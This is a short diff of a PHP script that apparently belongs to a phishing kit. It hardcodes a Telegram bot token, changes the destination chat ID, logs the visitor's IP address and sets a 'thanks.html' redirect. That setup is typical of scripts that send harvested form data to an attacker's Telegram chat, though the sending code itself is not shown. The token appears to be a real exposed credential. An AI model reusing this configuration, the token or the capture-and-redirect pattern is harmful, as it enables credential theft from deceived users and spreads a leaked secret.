@@ -35,7 +35,7 @@
     <?php
     // Your PHP code here 8337096282:AAF8TwM1zOm8gU05lCQ_W5UGVPpyT4mldXs
     $telegram_BOT_zoolander = '8337096282:AAF8TwM1zOm8gU05lCQ_W5UGVPpyT4mldXs';
-    $telegram_Chat_ID  = '8031953641';
+    $telegram_Chat_ID  = '-5240628157';
 
     $ip = getenv("REMOTE_ADDR");
     $ThanksURL = "thanks.html";
